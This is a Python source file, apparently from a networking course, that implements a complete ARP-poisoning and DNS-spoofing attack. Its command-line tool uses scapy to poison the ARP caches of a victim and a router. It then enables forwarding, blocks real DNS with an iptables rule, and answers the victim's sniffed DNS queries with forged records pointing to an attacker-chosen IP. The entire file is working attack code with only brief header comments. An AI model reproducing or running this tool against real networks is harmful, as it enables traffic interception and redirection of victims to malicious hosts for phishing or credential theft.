#  =================================================================
#  SOURCE FILE:    DNSspoof.py
#
#  PROGRAM:        ARP Posisoning a victim machine, responding with spoofed DNS responses.
#
#  DATE: October 24, 2017
#
#
#  DESIGNERS: Paul Cabanez & Justin Chau
#
#  python spoof.py -v 192.168.0.11 -i 192.168.0.10 -r 192.168.0.100 -t 24.80.73.161
#
#  NOTES:
#  Our Attacking machine initiates ARP Poisoning on the victim machine.
#  We will sniff for their DNS requests, then create a spoofed packet that will
#  redirect them to our target DNS responder.
#  =================================================================

#!/usr/bin/env python

from scapy.all import *
from multiprocessing import Process
from subprocess import Popen, PIPE
import argparse, threading, time, re

#parse command line arguments
parser = argparse.ArgumentParser(description='ARP Poisoning and DNS Spoofing')
parser.add_argument('-v', '--victim', dest='victimIP', help="IP Address of the victim", required=True)
parser.add_argument('-i', '--ip', dest='localIP', help="Our IP Address", required=True)
parser.add_argument('-r', '--router', dest='routerIP', help="IP Address of the Router", required=True)
parser.add_argument('-t', '--target', dest='targetIP', help="IP Address of our DNS Responder", required=True)

args = parser.parse_args()
victimIP = args.victimIP
localIP = args.localIP
routerIP = args.routerIP
targetIP = args.targetIP
localMAC = ""
victimMAC = ""
routerMAC = ""

#get MACaddress of local machine
def getOurMAC(interface):
    try:
        mac = open('/sys/class/net/'+interface+'/address').readline()
    except:
        mac = "00:00:00:00:00:00"

    return mac[0:17]


#returns MAC address of victim IP
def getMAC(IP):

    #ping to add the target to our system's ARP cache
    pingResult = Popen(["ping", "-c 1", IP], stdout=PIPE)
    pid = Popen(["arp", "-n", IP], stdout=PIPE)
    s = pid.communicate()[0]

    MAC = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]

    return MAC


#constructs and sends arp packets to send to router and to victim.
def ARPpoison(localMAC, victimMAC, routerMAC):

    arpPacketVictim = Ether(src=localMAC, dst=victimMAC)/ARP(hwsrc=localMAC, hwdst=victimMAC, psrc=routerIP, pdst=victimIP, op=2)
    arpPacketRouter = Ether(src=localMAC, dst=routerMAC)/ARP(hwsrc=localMAC, hwdst=routerMAC, psrc=victimIP, pdst=routerIP, op=2)

    print str(victimIP) + " has been poisoned."
    while True:
        try:
            sendp(arpPacketVictim, verbose=0)
            sendp(arpPacketRouter, verbose=0)
            #pause between each send
            time.sleep(3)
        except KeyboardInterrupt:
            sys.exit(0)

#construct and send a spoofed DNS response packet to the victim
def respond(packet):
    global targetIP
    responsePacket = (IP(dst=victimIP, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                    DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=targetIP)))

    send(responsePacket, verbose=0)
    print "Forwarded spoofed DNS Packet"
    #print "Received: "+ str(targetIP)
    return

#this parse creates a thread
def parse(packet):

    if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
        respondThread = threading.Thread(target=respond, args=packet)
        respondThread.start()

#initiate sniff filter for DNS requests
def DNSsniffer():
    global victimIP
    print "Sniffing DNS Requests"
    sniffFilter = "udp and port 53 and src " +str(victimIP)
    sniff(filter=sniffFilter, prn=parse)

#invoked on user exit. Flush iptables rules
def reset():
    Popen(["iptables -F"], shell=True, stdout=PIPE)

#Setup function
def setup():
    #setup forwarding rules
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    #disable forwarding of DNS requests to router
    #iptables rule
    Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=PIPE)

def main():
    setup()

    victimMAC = getMAC(victimIP)
    #Datacomm card
    localMAC = getOurMAC("eno1")
    routerMAC = getMAC(routerIP)

    #seperate threads for ARP poisoning and DNS spoofing
    ARPThread = threading.Thread(target=ARPpoison, args=(localMAC, victimMAC, routerMAC))
    sniffThread = threading.Thread(target=DNSsniffer)

    #make threads daemons, so that when the main thread receives KeyboardInterrupt the whole process terminates
    ARPThread.daemon = True
    sniffThread.daemon = True

    ARPThread.start()
    sniffThread.start()


    #Keyboard Interrupt
    while True:
        try:
            time.sleep(5)
        except KeyboardInterrupt:
            reset()
            print "Exiting"
            sys.exit(0)


main()
